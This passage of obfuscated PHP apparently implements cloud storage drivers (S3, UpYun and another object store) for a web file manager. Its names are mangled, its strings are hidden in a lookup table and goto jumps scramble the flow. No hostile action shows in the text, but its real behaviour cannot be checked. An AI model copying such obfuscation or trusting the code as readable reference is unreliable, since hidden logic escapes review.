? $CÎóŞø¸˜ö[33] : $CÎóŞø¸˜ö[412] . $this->region; goto d¶Òø—ê…; Dœß’Ï•°é: } public function download($FÒƒªà‡©, $dÚæ¬ºÒÓ) { goto CÑ¡›¦ğ; CÑ¡›¦ğ: $FïÏÇÊ¦Ù™ = IO::getPathInner(IO::mkfile($dÚæ¬ºÒÓ)); if (!($E„•¢†Îë = $this->link($FÒƒªà‡©))) { return !1; } $f¾ğ™‘°— = 0; goto cø„…ÂÔ²ä; cø„…ÂÔ²ä: $d¸©ŠˆË£ = 1024 * 200; $aª«âäÁË = fopen($FïÏÇÊ¦Ù™, $_SERVER[îÖ][1220]); while (!0) { $Dõ›çëô‡ = $this->fileSubstr($FÒƒªà‡©, $f¾ğ™‘°—, $d¸©ŠˆË£); if ($Dõ›çëô‡ === !1) { return !1; } fwrite($aª«âäÁË, $Dõ›çëô‡); $f¾ğ™‘°— += $d¸©ŠˆË£; if (strlen($Dõ›çëô‡) < $d¸©ŠˆË£) { break; } } goto Eš˜ÚšˆÃ; Eš˜ÚšˆÃ: fclose($aª«âäÁË); return $dÚæ¬ºÒÓ; goto añ»ÂĞóß•; añ»ÂĞóß•: } public function link($A¤…ƒÏŒå, $a½±Õ‚Éœİ = '') { if (!$this->isFile($A¤…ƒÏŒå)) { return !1; } $f¦ ÛÄëÈÃ = $this->getHost() . $_SERVER[îÖ][8] . $this->pathEncode($A¤…ƒÏŒå) . $a½±Õ‚Éœİ; return $this->auth->privateDownloadUrl($f¦ ÛÄëÈÃ, 3600 * 12); } public function fileOut($cÏª²É·İ, $e™Òà„”ñ = false, $CÆìª›İ¢ = false, $a·¹»¾°ğÄ = '') { $Dæ©¦—å‡” =& $_SERVER[îÖ]; if (!$CÆìª›İ¢) { $CÆìª›İ¢ = $this->pathThis($cÏª²É·İ); } $eÜ·à†¾¾Š = $e™Òà„”ñ ? $Dæ©¦—å‡”[1221] . rawurlencode($CÆìª›İ¢) : $Dæ©¦—å‡”[33]; $Eº¡äÖ›ùº = $this->link($cÏª²É·İ, $eÜ·à†¾¾Š); $this->fileOutLink($Eº¡äÖ›ùº); } public function fileOutServer($aÃù˜­İö, $E‰„¢°Ôï˜ = false, $a¼ã‘æØ = false, $BØ¾’™§ƒç = '') { parent::fileOut($aÃù˜­İö, $E‰„¢°Ôï˜, $a¼ã‘æØ, $BØ¾’™§ƒç); } public function fileOutImage($b¥¸’¢¥Ó, $b¨¬Š³›óÆ = 250) { $cêŒ‚œÜëŠ = $this->link($b¥¸’¢¥Ó, $_SERVER[îÖ][1222] . $b¨¬Š³›óÆ); $this->fileOutLink($cêŒ‚œÜëŠ); } public function fileOutImageServer($d¼ëÉá‡Š”, $E”Àëƒ·Ä = 250) { parent::fileOutImage($d¼ëÉá‡Š”, $E”Àëƒ·Ä); } public function hashMd5($DªÎÙËï£é) { $Eï ¦áƒ‘ =& $_SERVER[îÖ]; $cÖÔ¥«Ïø = $this->objectMeta($DªÎÙËï£é); return isset($cÖÔ¥«Ïø[$Eï ¦áƒ‘[196]]) ? $cÖÔ¥«Ïø[$Eï ¦áƒ‘[196]] : !1; $D½­ÙÈøõ§ = $this->link($DªÎÙËï£é, $Eï ¦áƒ‘[1223]); } public function size($eî÷Æ­Æ©ç) { $f–íËŸŠçâ = $this->objectMeta($eî÷Æ­Æ©ç); return $f–íËŸŠçâ ? $f–íËŸŠçâ[$_SERVER[îÖ][77]] : 0; } public function info($AÜğ³à‡¤ó) { if ($this->isFolder($AÜğ³à‡¤ó)) { return $this->folderInfo($AÜğ³à‡¤ó); } else { if ($this->isFile($AÜğ³à‡¤ó)) { return $this->fileInfo($AÜğ³à‡¤ó); } } return !1; } public function exist($cá‰†Çø‚) { return $this->isFile($cá‰†Çø‚) || $this->isFolder($cá‰†Çø‚); } public function isFile($CÒ¨×åƒ»í) { return !$this->isFolder($CÒ¨×åƒ»í) && $this->objectMeta($CÒ¨×åƒ»í); } public function isFolder($EÙñù’‡Ã£) { return $this->cacheMethod($_SERVER[îÖ][223], $EÙñù’‡Ã£); } protected function objectMeta($CÙ‰ÍãŸä) { return $this->cacheMethod($_SERVER[îÖ][224], $CÙ‰ÍãŸä); } protected function _objectMeta($aİÄ•ãÓ¸½) { $Cô–Ö†§ÆÜ =& $_SERVER[îÖ]; list($d‰àŠ°íÎ, $Cã Şãˆ„) = $this->bucketManager->stat($this->bucket, $aİÄ•ãÓ¸½); if ($d‰àŠ°íÎ) { $d‰àŠ°íÎ[$Cô–Ö†§ÆÜ[77]] = intval($d‰àŠ°íÎ[$Cô–Ö†§ÆÜ[1210]]); } return $d‰àŠ°íÎ; } protected function _isFolder($CÂõÛ˜Š‘Ø) { $aŞó«¦„®¿ =& $_SERVER[îÖ]; if ($CÂõÛ˜Š‘Ø == $aŞó«¦„®¿[33] || $CÂõÛ˜Š‘Ø == $aŞó«¦„®¿[8]) { return !0; } list($FÂ³Ñë¿ ò, $DÕ›ÄõÖâß) = $this->bucketManager->listFiles($this->bucket, trim($CÂõÛ˜Š‘Ø, $aŞó«¦„®¿[8]) . $aŞó«¦„®¿[8], $aŞó«¦„®¿[33], 1, $aŞó«¦„®¿[8]); return !empty($FÂ³Ñë¿ ò[$aŞó«¦„®¿[1209]]) || !empty($FÂ³Ñë¿ ò[$aŞó«¦„®¿[1212]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($AÀË—ƒÛ) { parent::__construct($AÀË—ƒÛ); } public function uploadFormData($f¿×±öŒ¤•, $Aé¬›œšÌ = 3600) { goto E»ø§ãé†»; fæ“ÇÂ‡æ·: $bñ¥‚ìˆ² = $Fñ·ÔÕÓ®Û[1130]; $B†§ƒ‘‡ÑÌ = $Aé¬›œšÌ . $Fñ·ÔÕÓ®Û[33]; $E’ç®äø„ = $Fñ·ÔÕÓ®Û[1094]; goto Aä·³¬Ê•Ÿ; Aä·³¬Ê•Ÿ: $AÏ²‘“…› = array($this->accessKey, $dÑí¶ğ†êÀ, $this->region, $eÈ¼ğª…™ø, $bñ¥‚ìˆ²); $B®åìË„É³ = implode($Fñ·ÔÕÓ®Û[8], $AÏ²‘“…›); $B³”ğ»¹Ø° = array($Fñ·ÔÕÓ®Û[1096] => gmdate($Fñ·ÔÕÓ®Û[1095], strtotime($Fñ·ÔÕÓ®Û[1131])), $Fñ·ÔÕÓ®Û[1097] => array(array($Fñ·ÔÕÓ®Û[1099] => $this->bucket), array($Fñ·ÔÕÓ®Û[1098] => $fòíØ›ä•Ç), array($Fñ·ÔÕÓ®Û[1100], $Fñ·ÔÕÓ®Û[1101], $Fñ·ÔÕÓ®Û[33]), array($Fñ·ÔÕÓ®Û[1100], $Fñ·ÔÕÓ®Û[1132], $Fñ·ÔÕÓ®Û[33]), array($Fñ·ÔÕÓ®Û[1100], $Fñ·ÔÕÓ®Û[1133], $Fñ·ÔÕÓ®Û[33]), array($Fñ·ÔÕÓ®Û[1102] => $E’ç®äø„), array($Fñ·ÔÕÓ®Û[1134] => $B®åìË„É³), array($Fñ·ÔÕÓ®Û[1135] => $d¿©º÷ø—), array($Fñ·ÔÕÓ®Û[1136] => $aÅËÛÖ…ö), array($Fñ·ÔÕÓ®Û[1137] => $B†§ƒ‘‡ÑÌ))); goto dî‡Íî´ƒ; eŸÚå·Çø: $E×£·–Ûö³ = hash_hmac($Fñ·ÔÕÓ®Û[1138], $eÈ¼ğª…™ø, $D£‘Ç¸ÏÈ, !0); $FíËåëø„ = hash_hmac($Fñ·ÔÕÓ®Û[1138], $bñ¥‚ìˆ², $E×£·–Ûö³, !0); $fõô¨¨ÁÛ = hash_hmac($Fñ·ÔÕÓ®Û[1138], $EÙ¼³í¯Ô‡, $FíËåëø„); goto a‰ÔÔêæÚ; a‰ÔÔêæÚ: $f±Ù…¨ÑÎï = array($Fñ·ÔÕÓ®Û[199] => $Fñ·ÔÕÓ®Û[33], $Fñ·ÔÕÓ®Û[1140] => $Fñ·ÔÕÓ®Û[33], $Fñ·ÔÕÓ®Û[1098] => $fòíØ›ä•Ç, $Fñ·ÔÕÓ®Û[1102] => $E’ç®äø„, $Fñ·ÔÕÓ®Û[1106] => $EÙ¼³í¯Ô‡, $Fñ·ÔÕÓ®Û[1141] => $B®åìË„É³, $Fñ·ÔÕÓ®Û[1142] => $d¿©º÷ø—, $Fñ·ÔÕÓ®Û[1143] => $aÅËÛÖ…ö, $Fñ·ÔÕÓ®Û[1144] => $B†§ƒ‘‡ÑÌ, $Fñ·ÔÕÓ®Û[1145] => $fõô¨¨ÁÛ, $Fñ·ÔÕÓ®Û[169] => $this->getHost()); return $f±Ù…¨ÑÎï; goto Dù½¥Ö‘‰; E¨Û––™óÓ: $eÈ¼ğª…™ø = $Fñ·ÔÕÓ®Û[59]; $aÅËÛÖ…ö = gmdate($Fñ·ÔÕÓ®Û[1129]); $dÑí¶ğ†êÀ = gmdate($Fñ·ÔÕÓ®Û[689]); goto fæ“ÇÂ‡æ·; dî‡Íî´ƒ: $EÙ¼³í¯Ô‡ = base64_encode(json_encode($B³”ğ»¹Ø°)); $eÈÇÀ¾ÏØ’ = hash_hmac($Fñ·ÔÕÓ®Û[1138], $dÑí¶ğ†êÀ, $Fñ·ÔÕÓ®Û[1139] . $this->secret, !0); $D£‘Ç¸ÏÈ = hash_hmac($Fñ·ÔÕÓ®Û[1138], $this->region, $eÈÇÀ¾ÏØ’, !0); goto eŸÚå·Çø; E»ø§ãé†»: $Fñ·ÔÕÓ®Û =& $_SERVER[îÖ]; $fòíØ›ä•Ç = $Fñ·ÔÕÓ®Û[185]; $d¿©º÷ø— = $Fñ·ÔÕÓ®Û[1128]; goto E¨Û––™óÓ; Dù½¥Ö‘‰: } public function multiUploadFormData($d©´åÇ¶ğ¾, $aÑõ†¦ó¹ß = 3600) { $e¿ÇİÀˆàù =& $_SERVER[îÖ]; $E¢˜Ê©ãÇ = gmdate($e¿ÇİÀˆàù[1224]); $aã—¯Î´ = array(); $C¬“ËÑİ³ = $this->client->getUploadId($this->bucket, $d©´åÇ¶ğ¾, $aã—¯Î´); if (!$C¬“ËÑİ³) { return !1; } return array($e¿ÇİÀˆàù[209] => $C¬“ËÑİ³, $e¿ÇİÀˆàù[169] => $this->getHost() . $e¿ÇİÀˆàù[8] . $this->pathEncode($d©´åÇ¶ğ¾), $e¿ÇİÀˆàù[210] => $E¢˜Ê©ãÇ, $e¿ÇİÀˆàù[89] => $d©´åÇ¶ğ¾); } public function multiUploadAuthData($eÓÕéÄØòÔ, $EÁÍ¹‘Ø‹Æ = array()) { goto Dê”¾íœÙ; bÙ¤Œ˜¬›: $EÊë±’µœ = $c¢‘Ø¤†‡[214]; $FµÈ¯‹¬ó¾ = $c¢‘Ø¤†‡[8] . $this->pathEncode($EâÌšˆÎ§) . $c¤‘²™Òâ; $B³·„µËÒ® = $this->client->__getSignatureV4($cçß¾Ş±‰í, $CæÉ²ÄòÑ, $EÊë±’µœ, $FµÈ¯‹¬ó¾); goto CóõÌƒ˜ê†; Dê”¾íœÙ: $c¢‘Ø¤†‡ =& $_SERVER[îÖ]; $c¤‘²™Òâ = isset($EÁÍ¹‘Ø‹Æ[$c¢‘Ø¤†‡[160]]) ? $EÁÍ¹‘Ø‹Æ[$c¢‘Ø¤†‡[160]] : $c¢‘Ø¤†‡[33]; $EâÌšˆÎ§ = $EÁÍ¹‘Ø‹Æ[$c¢‘Ø¤†‡[89]]; goto Eòë‘²æ¢Š; B‘¨ãã…³ä: if (isset($EÁÍ¹‘Ø‹Æ[$c¢‘Ø¤†‡[1225]])) { $cçß¾Ş±‰í[$c¢‘Ø¤†‡[1226]] = $EÁÍ¹‘Ø‹Æ[$c¢‘Ø¤†‡[1225]]; } $B¿íáĞ„Â = explode($c¢‘Ø¤†‡[171], $this->getHost()); $CæÉ²ÄòÑ = array($c¢‘Ø¤†‡[1227] => $B¿íáĞ„Â[1], $c¢‘Ø¤†‡[1228] => $c¢‘Ø¤†‡[33], $c¢‘Ø¤†‡[199] => $c¢‘Ø¤†‡[116], $c¢‘Ø¤†‡[1140] => $EÁÍ¹‘Ø‹Æ[$c¢‘Ø¤†‡[77]]); goto bÙ¤Œ˜¬›; Eòë‘²æ¢Š: unset($EÁÍ¹‘Ø‹Æ[$c¢‘Ø¤†‡[89]]); if (isset($EÁÍ¹‘Ø‹Æ[$c¢‘Ø¤†‡[211]])) { return $this->listUploadParts($EâÌšˆÎ§, $EÁÍ¹‘Ø‹Æ); } $cçß¾Ş±‰í = array(); goto B‘¨ãã…³ä; CóõÌƒ˜ê†: if (strpos($c¤‘²™Òâ, $c¢‘Ø¤†‡[213]) === 0) { if (isset($cçß¾Ş±‰í[$c¢‘Ø¤†‡[1226]])) { $d²‰ÔŒï§ğ = $cçß¾Ş±‰í[$c¢‘Ø¤†‡[1226]]; } else { if (isset($B³·„µËÒ®[$c¢‘Ø¤†‡[1226]])) { $d²‰ÔŒï§ğ = $B³·„µËÒ®[$c¢‘Ø¤†‡[1226]]; } else { $d²‰ÔŒï§ğ = hash($c¢‘Ø¤†‡[1138], $c¢‘Ø¤†‡[33]); } } return array($c¢‘Ø¤†‡[220] => $B³·„µËÒ®[$c¢‘Ø¤†‡[220]], $c¢‘Ø¤†‡[1226] => $d²‰ÔŒï§ğ, $c¢‘Ø¤†‡[210] => $B³·„µËÒ®[$c¢‘Ø¤†‡[1229]]); } return $B³·„µËÒ®[$c¢‘Ø¤†‡[220]]; goto fœ»õ½ã¨º; fœ»õ½ã¨º: } public function listUploadParts($cùÒ—‰Á÷, $d¦œĞ‡«© = array()) { goto d…™îÄìíÒ; A–Ï†™˜ëç: $FÓÛŠ¥ˆ” = array($aè´¹£•é[1227] => $aèÑ¨®öŠ­[1], $aè´¹£•é[199] => $aè´¹£•é[116], $aè´¹£•é[1140] => strlen($EÛİ‹Ï„¨Á)); $d¾ƒáµ¨ö„ = $aè´¹£•é[212]; $e™•¶ÇŒŞ“ = $aè´¹£•é[8] . $this->pathEncode($cùÒ—‰Á÷) . $d¦œĞ‡«©[$aè´¹£•é[160]]; goto BŠÕæ£ˆâ; eƒÓå†·š: $EÛİ‹Ï„¨Á .= $aè´¹£•é[1233]; $f—©ê³‰µµ = array(); $aèÑ¨®öŠ­ = explode($aè´¹£•é[171], $this->getHost()); goto A–Ï†™˜ëç; DÛÅá’ãÉ‚: if (!$A›‡Èğ»›) { return !1; } $EÛİ‹Ï„¨Á = $aè´¹£•é[1230]; foreach ($A›‡Èğ»› as $A‘ŸöÛ«³§) { $EÛİ‹Ï„¨Á .= $aè´¹£•é[1231] . "\74\120\x61\x72\164\116\165\x6d\x62\145\x72\76{$A‘ŸöÛ«³§[$aè´¹£•é[1182]]}\x3c\57\x50\141\x72\164\x4e\165\x6d\142\x65\162\x3e\12" . "\x3c\x45\x54\141\147\x3e{$A‘ŸöÛ«³§[$aè´¹£•é[1183]]}\x3c\x2f\105\124\141\147\76\12" . $aè´¹£•é[1232]; } goto eƒÓå†·š; BŠÕæ£ˆâ: $DøÆí»Âº¸ = $this->client->__getSignatureV4($f—©ê³‰µµ, $FÓÛŠ¥ˆ”, $d¾ƒáµ¨ö„, $e™•¶ÇŒŞ“, $EÛİ‹Ï„¨Á); return array($aè´¹£•é[220] => $DøÆí»Âº¸[$aè´¹£•é[220]], $aè´¹£•é[210] => $DøÆí»Âº¸[$aè´¹£•é[1229]], $aè´¹£•é[222] => $A›‡Èğ»›, $aè´¹£•é[1226] => $DøÆí»Âº¸[$aè´¹£•é[1226]]); goto e¯‰ÏÀ¶š; d…™îÄìíÒ: $aè´¹£•é =& $_SERVER[îÖ]; $EË¾ÅÑ ¤å = str_replace($aè´¹£•é[221], $aè´¹£•é[33], $d¦œĞ‡«©[$aè´¹£•é[160]]); $A›‡Èğ»› = $this->client->listParts($this->bucket, $cùÒ—‰Á÷, $EË¾ÅÑ ¤å); goto DÛÅá’ãÉ‚; e¯‰ÏÀ¶š: } public function link($Bƒ¶ŒÖã‡, $c‚Ğß–Ëà£ = array()) { return parent::link($Bƒ¶ŒÖã‡, $c‚Ğß–Ëà£); } public function fileOut($BòÌ¯­öçÓ, $a¥å®Øœì = false, $Còç•˜³ÙŞ = false, $BÔğİ¥Á¤Â = '') { if (strstr($this->endpoint, $_SERVER[îÖ][1234])) { return parent::fileOutServer($BòÌ¯­öçÓ, $a¥å®Øœì, $Còç•˜³ÙŞ, $BÔğİ¥Á¤Â); } parent::fileOut($BòÌ¯­öçÓ, $a¥å®Øœì, $Còç•˜³ÙŞ, $BÔğİ¥Á¤Â); } public function fileOutImage($cÙàƒÀäùõ, $cÜ³†Û¿ğ“ = 250) { if (strstr($this->endpoint, $_SERVER[îÖ][1234])) { return parent::fileOutImageServer($cÙàƒÀäùõ, $cÜ³†Û¿ğ“); } parent::fileOutImage($cÙàƒÀäùõ, $cÜ³†Û¿ğ“); } public function fileOutLink($Fãê¦´›²) { $BŒ‘ ¨¨Ş =& $_SERVER[îÖ]; if (substr($Fãê¦´›², 0, 7) == $BŒ‘ ¨¨Ş[1109]) { $Fãê¦´›² = $BŒ‘ ¨¨Ş[1110] . substr($Fãê¦´›², 7); } header($BŒ‘ ¨¨Ş[156] . $Fãê¦´›²); die; } public function getHost() { $FÃåš•âÛÊ =& $_SERVER[îÖ]; $B¶ˆÅ‰‰áƒ = str_rtrim(parent::getHost(), $FÃåš•âÛÊ[8] . $this->bucket); $B¶ˆÅ‰‰áƒ = explode($FÃåš•âÛÊ[171], $B¶ˆÅ‰‰áƒ); return $B¶ˆÅ‰‰áƒ[0] . $FÃåš•âÛÊ[171] . $this->bucket . $FÃåš•âÛÊ[91] . $B¶ˆÅ‰‰áƒ[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($d±±¡µˆø, $BÅ•´ÉÀç = 0) { parent::__construct(); $this->source = $d±±¡µˆø; $this->sourceSize = $BÅ•´ÉÀç; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($Fê¥º¸…Ü = false) { return $this->sourceSize; } public function getContent($BÔ¬¹ÆÉŒ = false) { if ($this->sourceType == self::TYPE_STRING) { return $this->source; } if ($this->sourceType == self::TYPE_FILE) { $fÌÔùÃå¦Ñ = ftell($this->source); $E«°¹ª‰¸Ê = @fread($this->source, $this->sourceSize); fseek($this->source, $fÌÔùÃå¦Ñ); return $E«°¹ª‰¸Ê; } } public function fileSubstr($D–‹¤çíÖ = false, $aÁñĞ¸œ¨ = 0, $A•œ±¯˜¿— = 0) { if (!$A•œ±¯˜¿—) { $A•œ±¯˜¿— = $this->sourceSize; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $aÁñĞ¸œ¨, $A•œ±¯˜¿—); } if ($this->sourceType == self::TYPE_FILE) { $dáŞ×œ‘³“ = ftell($this->source); fseek($this->source, $dáŞ×œ‘³“ + $aÁñĞ¸œ¨); $A„º«¾Ø¡ã = @fread($this->source, $A•œ±¯˜¿—); fseek($this->source, $dáŞ×œ‘³“); return $A„º«¾Ø¡ã; } } public function hashMd5($FçĞá¸ãÑ = false) { return md5($this->getContent()); } public static function hash($FğÚµ ™„š, $cëÉàñõ’ = 0) { $Dˆéœ«Èâ— = new PathDriverStream($FğÚµ ™„š, $cëÉàñõ’); return $Dˆéœ«Èâ—->hashSimple($FğÚµ ™„š); } public static function md5($Eõ¬„†¹òê, $e§²‚‘Œ¬ = 0) { $a­×„Ğ¬ªƒ = new PathDriverStream($Eõ¬„†¹òê, $e§²‚‘Œ¬); return $a­×„Ğ¬ªƒ->hashMd5($Eõ¬„†¹òê); } } goto FÇ»§·°Î; cƒ¥ß¸­™: function beforeShutdownFatalError($Bƒæºª¨«) { think_exception($Bƒæºª¨«); } $_SERVER[$_SERVER[©•ÖÏ¥Ø][48]] = $AÔÚÚ…ÔÜ·($_SERVER[$_SERVER[©•ÖÏ¥Ø][45]]); $E½®Ü³´éÅ = E_ALL ^ E_NOTICE ^ E_WARNING ^ E_DEPRECATED; goto FŞ‘æõ©ùù; FÇ»§·°Î: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\x74\164\160\72\57\x2f\166\x30\x2e\x61\x70\151\56\x75\160\171\x75\156\56\143\x6f\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($D¬ª•ÙšÍ) { parent::__construct(); $this->_init($D¬ª•ÙšÍ); } public function _init($fã­ºÏÎ) { foreach ($fã­ºÏÎ as $Fæ ÃŸ¿ö« => $cÑÉÖ‘¿) { if (isset($this->{$Fæ ÃŸ¿ö«})) { $this->{$Fæ ÃŸ¿ö«} = $cÑÉÖ‘¿; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { show_json($_SERVER[îÖ][1235], !1); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($aó‚§—¿ , $Cœ¤åŸ£Éô = "\107\105\x54") { $c­±æ‰…© =& $_SERVER[îÖ]; $Bà¦Ç¬¢õè = gmdate($c­±æ‰…©[1199]); $A¸·ä„Ä˜â = base64_encode(hash_hmac($c­±æ‰…©[1236], "{$Cœ¤åŸ£Éô}\46{$aó‚§—¿ }\46{$Bà¦Ç¬¢õè}", md5("{$this->userpass}"), !0)); $bŞÅ‡ó¿õË = array("\101\165\164\150\157\162\x69\172\141\x74\151\157\156\x3a\x55\x50\131\125\116\x20{$this->username}\72{$A¸·ä„Ä˜â}", "\104\141\164\145\72{$Bà¦Ç¬¢õè}"); return $bŞÅ‡ó¿õË; } public function ussRequest($EŠçëˆ†Øº, $BÊõŸíãç = "\107\x45\x54", $FÇè¸¸ø‹ = false, $fÛŞ‰Ÿƒ–¸ = false, $DËĞµ„ìª† = false) { goto Fè½½ÀÃÀ; CëÓÚ‹õøá: if (!$cÇïê—Â”­) { return array($a‰ËÉ§‡ô[1026] => !1, $a‰ËÉ§‡ô[1028] => $a‰ËÉ§‡ô[1237]); } if (strtolower($BÊõŸíãç) == $a‰ËÉ§‡ô[184] || in_array($cÇïê—Â”­[$a‰ËÉ§‡ô[1026]], array($a‰ËÉ§‡ô[1094], $a‰ËÉ§‡ô[1238]))) { $FÇè¸¸ø‹ = $cÇïê—Â”­[$a‰ËÉ§‡ô[1239]]; } else { $FÇè¸¸ø‹ = json_decode($cÇïê—Â”­[$a‰ËÉ§‡ô[1028]], !0); if (!$FÇè¸¸ø‹) { $FÇè¸¸ø‹ = $cÇïê—Â”­[$a‰ËÉ§‡ô[1028]]; } else { if (!$cÇïê—Â”­[$a‰ËÉ§‡ô[688]] && isset($FÇè¸¸ø‹[$a‰ËÉ§‡ô[1240]])) { $FÇè¸¸ø‹ = $FÇè¸¸ø‹[$a‰ËÉ§‡ô[1240]]; } } } return array($a‰ËÉ§‡ô[1026] => $cÇïê—Â”­[$a‰ËÉ§‡ô[688]], $a‰ËÉ§‡ô[1028] => $FÇè¸¸ø‹); goto aÖŒÜÉö; Fè½½ÀÃÀ: $a‰ËÉ§‡ô =& $_SERVER[îÖ]; $EŠçëˆ†Øº = trim($EŠçëˆ†Øº, $a‰ËÉ§‡ô[8]); $EÅÍ¼àŠŠ¹ = "\57{$this->bucket}\x2f{$EŠçëˆ†Øº}"; goto Eõâ®”÷ö; Eõâ®”÷ö: $FØÆÎÑŸŞÑ = $this->ussHeaders($EÅÍ¼àŠŠ¹, $BÊõŸíãç); if ($fÛŞ‰Ÿƒ–¸) { $FØÆÎÑŸŞÑ = array_merge($FØÆÎÑŸŞÑ, $fÛŞ‰Ÿƒ–¸); } $cÇïê—Â”­ = url_request($this->endpoint . $EÅÍ¼àŠŠ¹, $BÊõŸíãç, $FÇè¸¸ø‹, $FØÆÎÑŸŞÑ, $DËĞµ„ìª†); goto CëÓÚ‹õøá; aÖŒÜÉö: } public function mkfile($B­Òº…¸˜¶, $D¢º‹µ›‹ö = '', $F›ÜÅ…±æ¯ = REPEAT_RENAME) { if ($this->setContent($B­Òº…¸˜¶, $D¢º‹µ›‹ö)) { return $this->getPathOuter($B­Òº…¸˜¶); } return !1; } public function mkdir($d’í÷·‹×, $féßù”Õ¢â = REPEAT_SKIP) { $fÖß“­ã® =& $_SERVER[îÖ]; $có´®ª÷™© = trim($d’í÷·‹×, $fÖß“­ã®[8]); if ($this->_isFolder($có´®ª÷™©)) { return $this->getPathOuter($có´®ª÷™©); } $dò£êèğíï = array($fÖß“­ã®[1241]); $AÓàïÌøø = $this->ussRequest($có´®ª÷™©, $fÖß“­ã®[212], !1, $dò£êèğíï); return $AÓàïÌøø[$fÖß“­ã®[1026]] ? $this->getPathOuter($có´®ª÷™©) : !1; } public function copyFile($f¼½ƒò¤î, $F»Ï–õŞºµ) { $FëŠ×Ïà¹ =& $_SERVER[îÖ]; $a»ŠÛÎ³Õ = array($FëŠ×Ïà¹[1242] . "\57{$this->bucket}\x2f{$f¼½ƒò¤î}", $FëŠ×Ïà¹[1243]); $aô¿À½°ÔÜ = $this->ussRequest($F»Ï–õŞºµ, $FëŠ×Ïà¹[214], !1, $a»ŠÛÎ³Õ); return $aô¿À½°ÔÜ[$FëŠ×Ïà¹[1026]] ? !0 : $this->getPathOuter($F»Ï–õŞºµ); } public function moveFile($cÒÁ ÏŸî¼, $eÑ™‰ÚŠç) { $f‹©öÍ…Á =& $_SERVER[îÖ]; $c‘ßê–‚ôæ = array($f‹©öÍ…Á[1244] . "\57{$this->bucket}\x2f{$cÒÁ ÏŸî¼}", $f‹©öÍ…Á[1243]); $bîİß´ê† = $this->ussRequest($eÑ™‰ÚŠç, $f‹©öÍ…Á[214], !1, $c‘ßê–‚ôæ); return $bîİß´ê†[$f‹©öÍ…Á[1026]] ? !0 : $this->getPathOuter($eÑ™‰ÚŠç); } public function delFile($c¡Œ×è§õ‚) { $eöåÕŞÑ´„ =& $_SERVER[îÖ]; $a–“Â“™Ç = $this->ussRequest($c¡Œ×è§õ‚, $eöåÕŞÑ´„[1245]); return $a–“Â“™Ç[$eöåÕŞÑ´„[1026]] ? !0 : !1; } public function delFolder($F³ÄÙÃĞô») { $E§±„ù¥‰ =& $_SERVER[îÖ]; $dÛÉ¡ÒÖ“‘ = $this->listAll($F³ÄÙÃĞô»); krsort($dÛÉ¡ÒÖ“‘); foreach ($dÛÉ¡ÒÖ“‘ as $aÒÒƒ÷‰¬©) { $this->ussRequest($aÒÒƒ÷‰¬©[$E§±„ù¥‰[75]], $E§±„ù¥‰[1245]); } return $this->ussRequest($F³ÄÙÃĞô», $E§±„ù¥‰[1245]); } public function rename($a°ÎîÌ¢öÑ, $a‚Ğ¾˜äùã) { if ($this->isFile($a°ÎîÌ¢öÑ)) { $a‚Ğ¾˜äùã = get_path_father($a°ÎîÌ¢öÑ) . $a‚Ğ¾˜äùã; return $this->moveFile($a°ÎîÌ¢öÑ, $a‚Ğ¾˜äùã); } return $this->renameObject($a°ÎîÌ¢öÑ, $a‚Ğ¾˜äùã); } public function fileInfo($E°¿íŠÇãÓ, $BÛôåºêÚ¿ = false, $eïÛ‡Íç = array()) { $Bñ £¡œğ =& $_SERVER[îÖ]; if ($BÛôåºêÚ¿) { return array($Bñ £¡œğ[28] => $this->pathThis($E°¿íŠÇãÓ), $Bñ £¡œğ[75] => $this->getPathOuter($Bñ £¡œğ[8] . $E°¿íŠÇãÓ), $Bñ £¡œğ[29] => $Bñ £¡œğ[167], $Bñ £¡œğ[77] => isset($eïÛ‡Íç[$Bñ £¡œğ[325]]) ? $eïÛ‡Íç[$Bñ £¡œğ[325]] : 0, $Bñ £¡œğ[160] => $this->ext($E°¿íŠÇãÓ)); } $bÙ÷ÓÍÑºÅ = array($Bñ £¡œğ[28] => $this->pathThis($E°¿íŠÇãÓ), $Bñ £¡œğ[75] => $this->getPathOuter($Bñ £¡œğ[8] . $E°¿íŠÇãÓ), $Bñ £¡œğ[29] => $Bñ £¡œğ[167], $Bñ £¡œğ[187] => 0, $Bñ £¡œğ[107] => isset($F¶É‹ô Õ…[$Bñ £¡œğ[1246]]) ? $F¶É‹ô Õ…[$Bñ £¡œğ[1246]] : 0, $Bñ £¡œğ[77] => isset($eïÛ‡Íç[$Bñ £¡œğ[325]]) ? $eïÛ‡Íç[$Bñ £¡œğ[325]] : 0, $Bñ £¡œğ[160] => $this->ext($E°¿íŠÇãÓ), $Bñ £¡œğ[188] => !0, $Bñ £¡œğ[189] => !0); if (empty($eïÛ‡Íç)) { $eïÛ‡Íç = $this->objectMeta($E°¿íŠÇãÓ); if (!$eïÛ‡Íç) { return $bÙ÷ÓÍÑºÅ; } $bÙ÷ÓÍÑºÅ[$Bñ £¡œğ[187]] = $eïÛ‡Íç[$Bñ £¡œğ[1247]]; $bÙ÷ÓÍÑºÅ[$Bñ £¡œğ[107]] = $eïÛ‡Íç[$Bñ £¡œğ[1248]]; $bÙ÷ÓÍÑºÅ[$Bñ £¡œğ[77]] = $eïÛ‡Íç[$Bñ £¡œğ[77]]; } return $bÙ÷ÓÍÑºÅ; } public function folderInfo($d–÷í¾•‹Î, $a¿Œùöªöˆ = false) { $eˆ òÆğ×ê =& $_SERVER[îÖ]; if ($a¿Œùöªöˆ) { return array($eˆ òÆğ×ê[28] => $this->pathThis($d–÷í¾•‹Î), $eˆ òÆğ×ê[75] => $this->getPathOuter($eˆ òÆğ×ê[8] . $d–÷í¾•‹Î), $eˆ òÆğ×ê[29] => $eˆ òÆğ×ê[76]); } $dãÑ×ÁÎÔ = array($eˆ òÆğ×ê[28] => $this->pathThis($d–÷í¾•‹Î), $eˆ òÆğ×ê[75] => $this->getPathOuter($eˆ òÆğ×ê[8] . 